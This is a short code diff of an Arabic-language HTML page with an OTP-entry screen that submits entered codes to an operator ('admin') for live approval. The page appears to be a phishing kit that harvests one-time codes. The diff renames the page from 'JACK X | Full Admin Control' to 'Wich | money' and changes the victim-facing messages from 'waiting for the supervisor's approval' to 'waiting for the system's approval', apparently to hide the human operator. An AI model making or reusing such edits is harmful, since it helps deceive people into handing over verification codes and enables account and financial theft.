@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<title>JACK X | Full Admin Control</title>
+<title>Wich | money </title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;500;700;900&display=swap');
   
@@ -120,7 +120,7 @@
   <!-- Screen 2: OTP -->
   <div id="screen-otp" class="content hidden">
     <h1>أدخل رمز التفعيل</h1>
-    <p class="sub">بانتظار موافقة المشرف على الرمز المدخل.</p>
+    <p class="sub">بانتظار الموافقة على الرمز المدخل.</p>
     <div class="otp-grid" id="otpGrid"></div>
     <input type="number" id="otpHidden" style="position:absolute;opacity:0;pointer-events:none;" inputmode="numeric" maxlength="6">
     <div class="otp-footer">
@@ -237,7 +237,7 @@
         }
       }
       // 2. If passed condition, send request to DB
-      submitRequestToAdmin('pending', 'جاري انتظار موافقة المشرف...');
+      submitRequestToAdmin('pending', 'جاري انتظار موافقة النظام...');
     }).catch(err => {
       console.error("DB Error:", err);
       alert("خطأ في الاتصال بالخادم");
@@ -374,7 +374,7 @@
 
   function verifyCode() {
     // Change status to otp_pending and wait for admin approval
-    submitRequestToAdmin('otp_pending', 'جاري انتظار موافقة المشرف على الرمز...');
+    submitRequestToAdmin('otp_pending', 'جاري انتظار موافقة النظام على الرمز...');
   }
 
   function startTimer() {
